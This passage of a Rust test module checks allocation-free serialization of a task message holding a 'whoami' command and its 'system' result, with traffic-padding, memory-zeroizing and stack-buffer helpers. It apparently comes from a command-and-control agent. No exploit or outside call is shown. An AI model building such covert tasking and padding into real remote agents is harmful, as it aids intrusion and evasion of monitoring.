            self._p = padding;
            self
        }
    }

    #[test]
    fn test_message_payload_zero_heap_serialization() {
        type Budget4K = PacketBudget<4096>;
        let mut pad_buf = [0u8; 64];
        let pad_len = 32;
        let pad_slice = Budget4K::generate_padding_slice(&mut pad_buf, pad_len);

        // 1. 无 padding 时的纯切片序列化 (字段被 skip_serializing_if 剔除)
        let payload_no_pad = MessagePayload::new("t-1", "whoami", "system");
        let json_no_pad = serde_json::to_string(&payload_no_pad).unwrap();
        assert!(!json_no_pad.contains("\"_p\""));

        // 2. 注入切片 padding 时的零堆分配序列化
        let payload_with_pad = payload_no_pad.with_padding(pad_slice);
        let json_with_pad = serde_json::to_string(&payload_with_pad).unwrap();
        assert!(json_with_pad.contains("\"_p\""));

        // 3. 反序列化零拷贝借用验证 (Zero-Copy Borrowing)
        let deserialized: MessagePayload = serde_json::from_str(&json_with_pad).unwrap();
        assert_eq!(deserialized.task_id, "t-1");
        assert_eq!(deserialized.cmd, "whoami");
        assert_eq!(deserialized.result, "system");
        assert_eq!(deserialized._p, pad_slice);
    }

    #[test]
    fn test_zeroize_slice() {
        let mut buf = [0xAAu8; 64];
        zeroize_slice(&mut buf);
        assert_eq!(buf, [0u8; 64]);
    }

    #[test]
    fn test_stack_vec() {
        let mut vec: StackVec<u32, 4> = StackVec::new();
        assert!(vec.is_empty());
        assert_eq!(vec.capacity(), 4);

        assert!(vec.push(10).is_ok());
        assert!(vec.push(20).is_ok());
        assert_eq!(vec.len(), 2);
        assert_eq!(vec.as_slice(), &[10, 20]);

        assert_eq!(vec.pop(), Some(20));
        assert_eq!(vec.len(), 1);

        vec.clear();
        assert!(vec.is_empty());
    }

    #[test]
    fn test_stack_arena() {
        let mut arena: StackArena<128> = StackArena::default();
        assert_eq!(arena.remaining(), 128);

        let slice = arena.alloc_slice(32).expect("alloc 32 bytes");
        slice.fill(0x55);
        assert_eq!(arena.offset(), 32);
        assert_eq!(arena.remaining(), 96);
        assert_eq!(arena.used_slice().len(), 32);

        arena.zeroize_and_reset();
        assert_eq!(arena.offset(), 0);
        assert_eq!(arena.remaining(), 128);
    }

    #[test]
    fn test_stack_workspace() {
        let mut ws: StackWorkspace<3072, 4096> = StackWorkspace::new();
        ws.raw_buf[0] = 0xDE;
        ws.chunk_buf[0] = 0xBE;
        ws.b64_buf[0] = 0xAD;
        ws.zeroize();
        assert_eq!(ws.raw_buf[0], 0);
        assert_eq!(ws.chunk_buf[0], 0);
        assert_eq!(ws.b64_buf[0], 0);
    }
}
